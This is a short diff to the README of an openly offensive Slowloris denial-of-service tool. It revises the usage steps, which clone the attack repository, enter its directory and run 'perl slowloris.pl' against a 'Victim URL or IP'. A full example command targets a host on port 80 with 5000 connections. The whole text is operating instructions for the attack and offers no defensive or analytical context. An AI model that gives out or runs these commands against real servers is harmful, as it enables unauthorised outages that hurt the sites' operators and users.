@@ -10,13 +10,13 @@ Get Slowloris File:
 ```
 1) Open Terminal
    $> cd /home
-2) Download slowloris.pl
+2) Download file slowloris.pl
    # $home/ git clone https://github.com/Amarudin2019/Slowloris-DOS-Attack.git
-3) Choose the directory where the file is downloaded
-   # $home/ cd slowloris
+3) Choose the directory where the file slowloris.pl was downloaded
+   # $home/ cd Slowloris-DOS-Attack
 4) Run application
-   # $home/slowlores/ perl slowloris.pl -dns (Victim URL or IP) -options
+   # $home/Slowloris-DOS-Attack/ perl slowloris.pl -dns (Victim URL or IP) -options
    Example:
-   # $home/slowlores/ perl slowloris.pl -dns 192.168.100.19 -port 80 -timeout 20 -num 5000 -cache
+   # $home/Slowloris-DOS-Attack/ perl slowloris.pl -dns 192.168.100.19 -port 80 -timeout 20 -num 5000 -cache
 ```
 Done
